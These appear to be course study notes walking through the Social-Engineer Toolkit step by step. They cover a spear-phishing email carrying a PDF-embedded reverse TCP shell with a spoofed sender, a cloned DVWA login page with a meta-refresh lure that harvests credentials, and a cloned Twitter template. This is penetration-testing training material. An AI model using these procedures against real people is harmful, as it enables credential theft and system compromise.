---
tags:
  - CyberSec/tools
  - CiscoEH
---
The **_Social-Engineer Toolkit (SET)_** is a tool developed by David Kennedy. This tool can be used to launch numerous social engineering attacks and can be integrated with third-party tools and frameworks such as Metasploit. SET is installed by default in Kali Linux and Parrot Security. However, you can install it on other flavors of Linux as well as on macOS. You can download SET from [_https://github.com/trustedsec/social-engineer-toolkit_](https://github.com/trustedsec/social-engineer-toolkit).

## create a spear phishing email using SET
**Step 1**
Launch SET by using the **_setoolkit_** command. You see the menu shown in Figure 4-2.
**Figure 4-2** - SET Main Menu
![[a25eddbc1697b02b2f29fec889321552_MD5.jpg|377x423]]

**Step 2**
Select **1) Social-Engineering Attacks** from the menu to start the social engineering attack. You now see the screen shown in Figure 4-3.

**Figure 4-3** - Social Engineering Attack Menu in SET

![[06c17beb0bcd77596c2f0bf2babeed5f_MD5.jpg|435x489]]

**Step 3**

**Step 3**. Select **1) Spear-Phishing Attack Vectors** from the menu to start the spear-phishing attack. You see the screen shown in Figure 4-4.

**Figure 4-4** - Spear-Phishing Attack Menu

![[7be038ebe817f7489ae0df32db428fbf_MD5.jpg]]

expand_less

**Step 4**

**Step 4**. To create a file format payload automatically, select **2) Create a FileFormat Payload**. You see the screen shown in Figure 4-5.

**Figure 4-5** - Creating a FileFormat Payload

![[6b9c15a698bf4e51bf6fbf67cc9cdc70_MD5.jpg]]

expand_less

**Step 5**

**Step 5**. Select **13) Adobe PDF Embedded EXE Social Engineering** as the file format exploit to use. (The default is the PDF embedded EXE.) You see the screen shown in Figure 4-6.

**Figure 4-6** - Adobe PDF Embedded EXE Social Engineering

![[59895dfa78397e8865592f95dc42d3f6_MD5.jpg]]

expand_less

**Step 6**  

**Step 6.** To have SET generate a normal PDF with embedded EXE and use a built-in blank PDF file for the attack, select **2) Use built-in BLANK PDF for attack**. You see the screen shown in Figure 4-7.

SET gives you the option to spawn a command shell on the victim machine after a successful exploitation. It also allows you to perform other post-exploitation activities, such as spawning a Meterpreter shell, Windows reverse VNC DLL, reverse TCP shell, Windows Shell Bind_TCP, and Windows Meterpreter Reverse HTTPS. Meterpreter is a post-exploitation tool that is part of the Metasploit framework. In Module 5, “Exploiting Wired and Wireless Networks,” you will learn more about the various tools that can be used in penetration testing.

**Figure 4-7** - Configuring SET to Spawn a Windows Reverse TCP Shell on the Victim

![[f315bdab0e0352d716b238b29ab288cf_MD5.jpg]]

expand_less

**Step 7**

**Step 7**. To use the Windows reverse TCP shell, select **1) Windows Reverse TCP Shell**. You see the screen shown in Figure 4-8.

**Figure 4-8** - Generating the Payload in SET

![[eb986d1a094002a3ed94143e4e64f91e_MD5.jpg]]

expand_less

**Step 8 - 9**

**Step 8**. When SET asks you to enter the IP address or the URL for the payload listener, select the IP address of your attacking system (**192.168.88.225** in this example), which is the default option since it automatically detects your IP address. The default port is 443, but you can change it to another port that is not in use in your attacking system. In this example, TCP port **1337** is used. After the payload is generated, the screen shown in Figure 4-9 appears.

**Step 9**. When SET asks if you want to rename the payload, select **2. Rename the file, I want to be cool**. and enter **chapter2.pdf** as the new name for the PDF file.

**Figure 4-9** - Renaming the Payload

![[54e4408caaa5923624b92c0651a1581c_MD5.jpg]]

expand_less

**Step 10**

**Step 10**. Select **1. E-Mail Attack Single Email Address**. The screen in Figure 4-10 appears.

**Figure 4-10** - Using a One-Time Email Template in SET

![[3788123fa195bf7d7dc536650f6b901e_MD5.jpg]]

expand_less

**Step 11 - 14**

**Step 11**. When SET asks if you want to use a predefined email template or create a one-time email template, select **2. One-Time Use Email Template.**

**Step 12**. Follow along as SET guides you through the steps to create the one-time email message and enter the subject of the email.

**Step 13**. When SET asks if you want to send the message as an HTML message or in plaintext, select the default, **plaintext**.

**Step 14**. Enter the body of the message by typing or pasting in the text from Example 4-2, earlier in this module (see Figure 4-11).

**Figure 4-11** - Sending the Email in SET

![[5af72bf10e1d9500ff79344d54b9781d_MD5.jpg]]

expand_less

**Step 15 - 19**

**Step 15**. Enter the recipient email address and specify whether you want to use a Gmail account or use your own email server or an open mail relay.

**Step 16**. Enter the “from” email address (the spoofed sender’s email address) and the “from name” the user will see.

**Step 17**. If you selected to use your own email server or open relay, enter the open-relay username and password (if applicable) when asked to do so.

**Step 18**. Enter the SMTP email server address and the port number. (The default port is 25.) When asked if you want to flag this email as a high-priority message, make a selection. The email is then sent to the victim.

**Step 19**. When asked if you want to set up a listener for the reverse TCP connection from the compromised system, make a selection.

---

## Part 1: Launching SET and Exploring the Toolkit

### Step 1: Load the SET application.

1. Start Kali Linux using the username **kali** and the password **kali**. Open a terminal session from the menu bar at the top of the screen.
2. SET must be run as root. Use the **sudo -i** command to obtain persistent root access. At the prompt, enter the command **setoolkit** to load the SET menu system. The Social Engineering Toolkit can also be run from the **Applications >Social Engineering Tools >social engineering toolkit (root)** choice on the Kali menu.

┌──(kali㉿Kali)-[~]

└─$ **sudo -i**

[sudo] password for kali:

┌──(root㉿Kali)-[~]

└─# **setoolkit**

If this is the first time that you have run SET, the license terms and conditions are displayed, and an agreement is required. Read the terms carefully.

3.  After reading the disclaimer, enter **y** to accept the terms of service.

**The Social-Engineer Toolkit is designed purely for good and not evil. If you are planning on using this tool for malicious purposes that are not authorized by the company you are performing assessments for, you are violating the terms of service and license of this toolset. By hitting yes (only one time), you agree to the terms of service and that you will only use this tool for lawful purposes only.**

Do you agree to the terms of service [y/n]: **y**

The initial SET menu is displayed, as shown:

   The Social-Engineer Toolkit is a product of TrustedSec.

            Visit: https://www.trustedsec.com 

   It's easy to update using the PenTesters Framework! (PTF)

 Visit https://github.com/trustedsec/ptf to update all your tools!

Select from the menu:

   1) Social-Engineering Attacks

   2) Penetration Testing (Fast-Track)

   3) Third Party Modules

   4) Update the Social-Engineer Toolkit

   5) Update SET configuration

   6) Help, Credits, and About

  7) Exit the Social-Engineer Toolkit

set>

### Step 2: Examine the Available Social-Engineering Attacks.

1. At the SET prompt, enter **1** and press **Enter** to access the Social-Engineering Attacks submenu.

set> **1**

Select from the menu:

   1) Spear-Phishing Attack Vectors

   2) Website Attack Vectors

   3) Infectious Media Generator

   4) Create a Payload and Listener

   5) Mass Mailer Attack

   6) Arduino-Based Attack Vector

   7) Wireless Access Point Attack Vector

   8) QRCode Generator Attack Vector

   9) Powershell Attack Vectors

  10) Third Party Modules

  11) Return back to the main menu.

12. Select each option to see a brief description of each exploit and what the tool does for each.

**Note**: Some options may not have a choice. In that case, use **CTRL-C** or enter **99** to return to the main menu.

Which option creates a DVD or USB thumb drive that will autorun malicious software when inserted into the target device?

Answer Area

3) Infectious Media Generator

Hide Answer

How could this functionality be used in a penetration test?

Answer Area

Answers will vary. The penetration tester could create and distribute some sort of benign malware on USB drives. The drives could be dropped in the parking lot and other open areas of the client facility. If the malware had a “phone home” functionality, the number of instances in which the USB drives were inserted into corporate computers could be quantified and reported.

Hide Answer

You are now ready to begin the web site cloning exploit.

## Part 2: Cloning a Website to Obtain User Credentials

In this part of the lab, you will create a perfect copy of the login page for a website. The fake login page will gather all credentials submitted to it and then redirect the user to the real website.

### Step 1: Investigate Web Attack Vectors in SET.

1. From the Social-Engineering Attacks submenu, choose **2) Website Attack Vectors** to begin the web site cloning exploit.

set> **2**

2. Review the brief attack description of each type of attack.

Which type of attack will you choose to create a cloned website to obtain login credentials for users on the target network?

Answer Area

3) Credential Harvester Attack Method

Hide Answer

3. Select **3) Credential Harvester Attack Method** from the menu. A description of the ways to configure this exploit is displayed.

Which method enables you to use a custom website for the exploit that you create?

Answer Area

The third method 3) Custom Import

Hide Answer

### Step 2: Clone the DVWA.vm Login Screen.

In this step, you will create a cloned website that duplicates the DVWA.vm login website. The SET application creates a website hosted on your Kali Linux computer. When the target users enter their credentials in the cloned website, the credentials and the users will be redirected to the real website without being aware of the exploit. This is similar to an on-path attack.

1. In this lab, we are using the internal website hosted on the DVWA.vm virtual machine. To see what the website looks like, open the Kali Firefox browser, and enter the URL **http://DVWA.vm/**. The login screen will appear. If the URL is not found, enter http://10.6.6.13/ to access the web server using its IP address.
    

What is the URL of the login screen?

Answer Area

DVWA.vm/login.php

Hide Answer

2. Return to the terminal session. Select **2) Site Cloner** from the **Credential Harvester Attack Method** menu. Information describing which IP address is needed to host the fake website and to receive the POST data is displayed. Enter the web attacker IP address at the prompt. This is the IP address of the virtual Kali internal interface on the 10.6.6.0/24 network. In an actual exploit, this would be the external (internet facing) address of the attack computer.
3. At the prompt, enter the IP address **10.6.6.1**.

set:webattack> IP address for the POST back in Harvester/Tabnabbing [10.0.2.15]:**10.6.6.1**

4. Next, enter the URL of the website that you want to clone. This is the URL of the DVWA website, **http://DVWA.vm**.

[-] SET supports both HTTP and HTTPS

[-] Example: http://www.thisisafakesite.com

set:webattack> Enter the url to clone:**http://DVWA.vm** 

[*] Cloning the website: http://DVWA.vm

[*] This could take a little bit...

5. When the website is cloned, the following message appears on the terminal.

The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.

[*] The Social-Engineer Toolkit Credential Harvester Attack

[*] Credential Harvester is running on port 80

[*] Information will be displayed to you as it arrives below:

**Note**: No prompt will be returned to you. This is because a listener is now active on port 80 on the Kali computer and all port 80 traffic will be redirected to this screen. Do not close the terminal window. Continue to Part 3.

## Part 3: Capturing and Viewing User Credentials

### Step 1: Create the Social Engineering Exploit.

In a “real-life” exploit, at this point, a phishing exploit containing a link or QR code that sends the user to the fake website is created and sent. In this lab, an html document is created to direct the user to the fake webpage. This document simulates a distributed phishing URL. It could be distributed as a file attachment in phishing emails.

1. Open the Kali Linux Mousepad text editor using the **Applications > Favorites > Text Editor** choice from the menu. Enter the HTML code shown into the Mousepad document.

**<html>**

**<head>**

**<meta http-equiv="refresh" content="0; url=http://10.6.6.1/" />**

**</head>**

**</html>**

2. Select **File > Save** from the Mousepad menu. Name the document **Great_link.html** and save it in the **/home/kali/Desktop** Folder. The icon appears on the Kali desktop.
3. Close the Mousepad application.

### Step 2: Capture User Credentials.

The purpose of the cloned website is to present a web page that looks identical to the one that the user is expecting. A good hacker would create a fake URL that would be very similar to the actual URL, so that unless the user inspects the URL very closely, it would go unnoticed.

1. Double-click the desktop icon for the **Great_link.html** page. The DVWA login page that you viewed in **Part 2, Step 2a** should appear in a browser window.

What URL appears on the browser now? Is it the same as the URL you recorded in Part 2, Step 2a?

Answer Area

The URL is http://10.6.6.1/ is displayed in the browser. No, they are not the same as in the previous part.

Hide Answer

2. Enter some information in the Username and Password fields and click **Login** to send the form.

Username: **some.user@gmail.com**

Password: **Pa55w0rdd!**

What is the URL after you entered the information and clicked the Login button? Is it the same as the URL you recorded in Part 2, Step 2a?

Answer Area

The URL DVWA.vm/login.php is displayed in the browser. Yes, it is the same URL as in the previous step.

Hide Answer

What happened?

Answer Area

After the login attempt, the cloned web page redirected the browser to the real web site. However, the user has real credentials have been provided to the hacker’s clone of the original website.

Hide Answer

### Step 3: View the Captured Information.

1. Return to the terminal session that is running the SET application. Output from the login attempt should appear, similar to what is shown:

[*] WE GOT A HIT! Printing the output:

POSSIBLE USERNAME FIELD FOUND: username=some.user@gmail.com

POSSIBLE PASSWORD FIELD FOUND: password=Pa55w0rdd!

POSSIBLE USERNAME FIELD FOUND: Login=Login

POSSIBLE USERNAME FIELD FOUND: user_token=69c0375a6ee98b96a5b643eed1e97f94

[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.

2. To save the report in XML format to use in other penetration testing applications, enter **CTRL**-**C**. The report file name and path are returned. Select the path and filename and right-click to copy the selection. The filenames that are created contain the date and time the file was created in this format:

2023-04-07 17:32:55.967169.xml

Continue to enter **99** and press **enter** until you have exited setoolkit. To view the content of the XML file, you need to place the filename in double-quotes (“) because it contains spaces and special characters. Use the **cat** command to see the information that is saved. The file path shown is the default path for the lab VM when this lab was created.

┌──(root㉿Kali)-[~]

└─# **cat /root/.set/reports/”2023-04-07 17:32:55.967169.xml”**

<?xml version=”1.0” encoding=”UTF-8”?>

<harvester>

   URL=http://DVWA.vm

   <url>      <param>username=some.user@gmail.com</param>

      <param>password=Pa55w0rdd!</param>

      <param>Login=Login</param>

      <param>user_token=69c0375a6ee98b96a5b643eed1e97f94</param>

   </url>

</harvester>

What information did the cloned web page gather?

Answer Area

The username and password of the user who attempted to login to the cloned webpage.

Hide Answer

What could a penetration tester do with this information?

Answer Area

Go to the real website and login in as a legitimate user.

---

# Perform a social engineering attack and instantiate a fake website to perform a credential harvesting attack.

expand_less

**Step 1 - 2**

**Step 1**. Launch SET by entering the **setoolkit** command.

**Step 2**. Select **1) Social-Engineering Attacks** from the main menu, as shown in Example 7-1.

**_Example 7-1_** - Starting the Social Engineering Attack

```
Select from the menu:   1) Social-Engineering Attacks   2) Penetration Testing (Fast-Track)   3) Third Party Modules   4) Update the Social-Engineer Toolkit   5) Update SET configuration   6) Help, Credits, and About  99) Exit the Social-Engineer Toolkitset> 1
```

expand_less

**Step 3**

**Step 3**. In the menu that appears (see Example 7-2), select **2)** **Website Attack Vectors**.

**_Example 7-2_** - Selecting Website Attack Vectors

```
Select from the menu:    1) Spear-Phishing Attack Vectors    2) Website Attack Vectors    3) Infectious Media Generator    4) Create a Payload and Listener    5) Mass Mailer Attack    6) Arduino-Based Attack Vector    7) Wireless Access Point Attack Vector    8) QRCode Generator Attack Vector    9) Powershell Attack Vectors   10) Third Party Modules   99) Return back to the main menu.set>2 
```

expand_less

**Step 4**

**Step 4**. In the menu and explanation that appear next (see Example 7-3), select **3) Credential Harvester Attack Method**.

**_Example 7-3_** - Selecting the Credential Harvester Attack Method

```
The Web Attack module is a unique way of utilizing multiple web-basedattacks in order to compromise the intended victim.The Java Applet Attack method will spoof a Java Certificate anddeliver a metasploit based payload. Uses a customized java appletcreated by Thomas Werth to deliver the payload.The Metasploit Browser Exploit method will utilize select Metasploitbrowser exploits through an iframe and deliver a Metasploit payload.The Credential Harvester method will utilize web cloning of awebsite that has a username and password field and harvest allthe information posted to the website.The TabNabbing method will wait for a user to move to a differenttab, then refresh the page to something different.The Web-Jacking Attack method was introduced by white_sheep, emgent.This method utilizes iframe replacements to make the highlighted URLlink to appear legitimate however when clicked a window pops up thenis replaced with the malicious link. You can edit the link replacementsettings in the set_config if it's too slow/fast.The Multi-Attack method will add a combination of attacks throughthe web attack menu. For example, you can utilize the Java Applet,Metasploit Browser, Credential Harvester/Tabnabbing all at once to seewhich is successful.The HTA Attack method will allow you to clone a site and performpowershell injection through HTA files which can be used forWindows-based powershell exploitation through the browser.   1) Java Applet Attack Method   2) Metasploit Browser Exploit Method   3) Credential Harvester Attack Method   4) Tabnabbing Attack Method   5) Web Jacking Attack Method   6) Multi-Attack Web Method   7) HTA Attack Method  99) Return to Main Menuset:webattack>3
```

expand_less

**Step 5**  

**Step 5**. In the menu that appears next (see Example 7-4), select **1) Web Templates** to use a predefined web template (Twitter). As you can see, you also have options to clone an existing website or import a custom website. In this example, you use a predefined web template.

**_Example 7-4_** - Selecting a Predefined Web Template

```
The first method will allow SET to import a list of pre-defined webapplications that it can utilize within the attack.The second method will completely clone a website of your choosingand allow you to utilize the attack vectors within the completelysame web application you were attempting to clone.The third method allows you to import your own website, note that youshould only have an index.html when using the import websitefunctionality.   1) Web Templates   2) Site Cloner   3) Custom Import  99) Return to Webattack Menuset:webattack>1
```

expand_less

**Step 6**

**Step 6**. In the menu shown in Example 7-5, enter the IP address of the host that you would like to use to harvest the user credentials (in this case, **192.168.88.225**). In this example, SET has recognized the attacking system’s IP address. If this occurs for you, you can just press **Enter** to select the attacking system’s IP address.

**_Example 7-5_** - Entering the Credential Harvester’s IP Address

```
[-] Credential harvester will allow you to utilize the clonecapabilities within SET[-] to harvest credentials or parameters from a website as well asplace them into a report------------------------------------------------------------------------- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS *IMPORTANT * --The way that this works is by cloning a site and looking for formfields to rewrite. If the POST fields are not usual methods forposting forms this could fail. If it does, you can always save theHTML, rewrite the forms to be standard forms and use the "IMPORT"feature. Additionally, really important:If you are using an EXTERNAL IP ADDRESS, you need to place theEXTERNAL IP address below, not your NAT address. Additionally, ifyou don't know basic networking concepts, and you have a privateIP address, you will need to do port forwarding to your NAT IPaddress from your external IP address. A browser doesn't know howto communicate with a private IP address, so if you don't specifyan external IP address if you are using this from an externalperspective, it will not work. This isn't a SET issue this is hownetworking works.set:webattack> IP address for the POST back in Harvester/Tabnabbing[192.168.88.225]:
```

expand_less

**Step 7**

**Step 7**. Select **3. Twitter**, as shown in Example 7-6.

**_Example 7-6_** - Selecting the Template for Twitter

```
--------------------------------------------------------                 **** Important Information ****For templates, when a POST is initiated to harvestcredentials, you will need a site for it to redirect.You can configure this option under:      /etc/setoolkit/set.configEdit this file, and change HARVESTER_REDIRECT andHARVESTER_URL to the sites you want to redirect toafter it is posted. If you do not set these, thenit will not redirect properly. This only goes fortemplates.--------------------------------------------------------  1. Java Required  2. Google  3. Twitterset:webattack> Select a template:3[*] Cloning the website: http://www.twitter.com[*] This could take a little bit...The best way to use this attack is if username and password formfields are available. Regardless, this captures all POSTs on awebsite.[*] The Social-Engineer Toolkit Credential Harvester Attack[*] Credential Harvester is running on port 80[*] Information will be displayed to you as it arrives below:
```
You can then redirect users to this fake Twitter site by sending a spear phishing email or taking advantage of web vulnerabilities such as cross-site scripting (XSS) and cross-site request forgery


